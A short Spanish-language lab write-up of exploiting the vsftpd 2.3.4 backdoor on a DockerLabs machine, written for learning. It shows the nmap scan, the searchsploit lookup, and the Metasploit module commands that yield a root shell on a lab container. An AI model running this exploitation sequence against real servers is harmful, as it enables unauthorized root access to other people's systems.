# Write-up - Explotación FTP vsftpd 2.3.4

**Sitio:** DockerLabs  
**Dificultad:** Muy Fácil  
**Fecha:** 27/05/2025  
**Aprendizaje:** Refresqué conceptos sobre el uso de `searchsploit` y aprendí un poco más sobre vulnerabilidades conocidas en servicios FTP, en este 
caso, una versión vulnerable de `vsftpd`.  
Esta máquina me permitió identificar un servicio FTP vulnerable, buscar un exploit con searchsploit, y explotarlo usando Metasploit. También me sirvió para seguir incorporando el 
flujo clásico de: detección de servicio → identificación de versión → explotación controlada en entorno de laboratorio.

---

## 1. Recopilación de información

`nmap -sSV -O --open 172.17.0.2`

> Resultado:

Sistema operativo: `Linux 4.x`  
Puerto `21/tcp` abierto  
Servicio detectado: `vsftpd 2.3.4`  

### 2. Búsqueda del exploit con searchsploit

`searchsploit vsftpd 2.3.4`

> Resultado:

`vsftpd 2.3.4 - Backdoor Command Execution ⇒ unix/remote/49757.py`  
`vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) ⇒ unix/remote/17491.rb`  

> Luego copié el exploit con:

`searchsploit -m 49757`

### 3. Uso de Metasploit

Dentro de `msfconsole`:

`search vsftpd 2.3.4`  
`use exploit/unix/ftp/vsftpd_234_backdoor`  
`run`  

Una vez obtenida la sesión:

whoami
> root
